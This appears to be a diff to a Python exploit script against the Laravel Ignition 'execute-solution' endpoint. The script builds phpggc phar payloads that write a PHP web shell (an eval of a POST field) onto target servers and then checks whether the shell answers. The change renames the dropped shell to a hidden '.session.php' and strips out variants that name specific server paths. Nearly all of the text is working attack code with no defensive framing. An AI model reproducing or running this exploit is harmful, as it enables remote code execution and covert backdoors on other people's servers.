@@ -92,7 +92,7 @@ class EXP:
                 break
 
     def check_success(self):
-        url = requests.compat.urljoin(self.target, "session_tmp.php")
+        url = requests.compat.urljoin(self.target, ".session.php")
         res = requests.get(url,verify=False,timeout=5)
         if res.status_code == 200 and "404" not in res.text:
             print(url," is ok!!!!!gogogo-------------")
@@ -112,7 +112,7 @@ class EXP:
             # 获取匹配的内容
             matched_content = match.group(1)  # 获取捕获组的内容
             print("匹配的内容是：", matched_content)
-            self.path = matched_content + "/public/session_tmp.php"
+            self.path = matched_content + "/public/.session.php"
         else:
             print("未找到匹配的内容！")
 
@@ -120,7 +120,7 @@ class EXP:
     def __init__(self, target):
         self.target = target
         self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
-        self.path = "session_tmp.php"
+        self.path = ".session.php"
         #if not self.__vul_check():
         #   print("[-] [%s] is seems not vulnerable." % (self.target))
         #    print("[*] You can also call obj.exp() to force an attack.")
@@ -134,17 +134,8 @@ class EXP:
              php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents {} '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
             """.format(self.path),
             "Laravel/RCE00":r"""
-             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents session_tmp.php '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
-            """.format(self.path),
-            "Laravel/RCE01":r"""
-             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/csgo/service/public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
-            """.format(self.path),
-            "Laravel/RCE02":r"""
-             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/csgo_lo//public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
-            """.format(self.path),
-            "Laravel/RCE03":r"""
-             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/api/service/public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
-            """.format(self.path),
+             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents .session.php '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
+            """.format(self.path)
         }
         self.exp()
 
